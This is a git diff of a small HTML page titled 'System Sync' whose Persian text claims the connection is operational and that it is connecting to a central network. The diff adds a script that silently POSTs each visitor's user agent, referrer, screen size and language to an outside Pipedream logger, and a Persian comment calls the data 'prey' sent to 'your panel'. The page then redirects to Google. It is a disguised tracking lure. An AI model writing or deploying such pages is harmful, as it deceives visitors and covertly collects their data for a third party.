@@ -1,13 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head><title>System Sync</title></head>
-<body style="text-align: center; font-family: sans-serif; padding-top: 100px;">
-    <h1>وضعیت اتصال: <span style="color: green;">فعال</span></h1>
-    <p>در حال انتقال به سرور امن...</p>
+<body style="text-align: center; font-family: sans-serif; padding-top: 100px; background: #fafafa;">
+    <div style="display: inline-block; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background: white;">
+        <h2>وضعیت: <span style="color: green;">عملیاتی</span></h2>
+        <p>در حال اتصال به شبکه مرکزی...</p>
+    </div>
+
     <script>
-        setTimeout(function() {
+        // آدرس اختصاصی تو در Pipedream
+        const loggerURL = "https://eox6t1ks7dm549j.m.pipedream.net";
+
+        // ارسال اطلاعات شکار به پنل تو
+        fetch(loggerURL, {
+            method: 'POST',
+            mode: 'no-cors', // برای جلوگیری از خطاهای امنیتی مرورگر
+            body: JSON.stringify({
+                ua: navigator.userAgent,
+                ref: document.referrer || "Direct Access",
+                screen: window.screen.width + "x" + window.screen.height,
+                lang: navigator.language
+            })
+        });
+
+        // انتقال به گوگل بعد از ۳ ثانیه
+        setTimeout(() => {
             window.location.href = "https://www.google.com";
-        }, 2000);
+        }, 3000);
     </script>
 </body>
 </html>
